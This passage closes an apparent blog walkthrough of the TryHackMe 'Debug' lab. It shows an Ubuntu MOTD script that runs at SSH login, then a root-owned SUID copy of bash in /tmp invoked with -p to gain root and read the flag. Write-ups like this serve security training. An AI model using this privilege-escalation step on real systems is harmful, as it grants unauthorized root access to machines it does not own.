<span style=color:#75715e>#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is free software; you can redistribute it and/or modify</span>
<span style=color:#75715e>#    it under the terms of the GNU General Public License as published by</span>
<span style=color:#75715e>#    the Free Software Foundation; either version 2 of the License, or</span>
<span style=color:#75715e>#    (at your option) any later version.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    This program is distributed in the hope that it will be useful,</span>
<span style=color:#75715e>#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style=color:#75715e>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style=color:#75715e>#    GNU General Public License for more details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e>#    You should have received a copy of the GNU General Public License along</span>
<span style=color:#75715e>#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style=color:#75715e>#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style=color:#f92672>[</span> -r /etc/lsb-release <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> . /etc/lsb-release

<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>[</span> -x /usr/bin/lsb_release <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
        <span style=color:#75715e># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>lsb_release -s -d<span style=color:#66d9ef>)</span>
<span style=color:#66d9ef>fi</span>

printf <span style=color:#e6db74>&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style=color:#e6db74>&#34;</span>$DISTRIB_DESCRIPTION<span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -o<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -r<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>uname -m<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><p>But how does this execute? Is there a cron? don&rsquo;t think so.</p><p>Since, the .bash_history shows we need to ssh for the instructions to execute, let&rsquo;s try and SSH as james.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403150745.png alt></p><h3 id=root>Root!<a hidden class=anchor aria-hidden=true href=#root>#</a></h3><p>Cool, we&rsquo;ve got SUID bit of root user on the bash file, let&rsquo;s get root! :)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>james@osboxes:~$ /tmp/bash  -p
bash-4.3# id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span>
bash-4.3# cd /root
bash-4.3# ls -al 
total <span style=color:#ae81ff>48</span>
drwx------  <span style=color:#ae81ff>7</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>10</span> 18:36 .
drwxr-xr-x <span style=color:#ae81ff>24</span> root root <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> ..
-rw-------  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1257</span> Mar <span style=color:#ae81ff>10</span> 18:38 .bash_history
-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>3106</span> Oct <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2015</span> .bashrc
drwxr-xr-x  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>9</span> 20:01 .bundle
drwx------  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>10</span> 18:36 .cache
drwxr-xr-x  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>9</span> 20:00 .gem
drwxr-xr-x  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>10</span> 18:35 .nano
-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>148</span> Aug <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2015</span> .profile
-rw-r--r--  <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>33</span> Mar  <span style=color:#ae81ff>9</span> 20:56 root.txt
drwx------  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>9</span> 20:55 .ssh
-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>211</span> Mar  <span style=color:#ae81ff>9</span> 19:59 .wget-hsts
bash-4.3# 
bash-4.3# 
</code></pre></div><p>The flag is of the characters what we need!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bash-4.3# wc -c root.txt 
<span style=color:#ae81ff>33</span> root.txt
bash-4.3# id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>james<span style=color:#f92672>)</span>
bash-4.3# uname -a 
Linux osboxes 4.15.0-45-generic <span style=color:#75715e>#48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><hr><p>Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/tryhackme/>tryhackme</a></li><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/metasploit/>metasploit</a></li><li><a href=https://umar0x01.sh/tags/rustscan/>rustscan</a></li><li><a href=https://umar0x01.sh/tags/php/>php</a></li><li><a href=https://umar0x01.sh/tags/deserialization/>deserialization</a></li><li><a href=https://umar0x01.sh/tags/rce/>rce</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li><li><a href=https://umar0x01.sh/tags/cracking/>cracking</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/internal-thm/><span class=title>« Prev Page</span><br><span>TryHackMe - Internal</span></a>
<a class=next href=https://umar0x01.sh/post/suid-enumeration/><span class=title>Next Page »</span><br><span>SUID Enumeration & Exploitation - The Automated Way!</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Debug&url=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f&hashtags=tryhackme%2cssh%2chttp%2cmetasploit%2crustscan%2cphp%2cdeserialization%2crce%2cprivesc%2ccracking"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f&title=TryHackMe%20-%20Debug&summary=TryHackMe%20-%20Debug&source=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f&title=TryHackMe%20-%20Debug"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Debug%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Debug on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Debug&url=https%3a%2f%2fumar0x01.sh%2fpost%2fdebug-thm%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>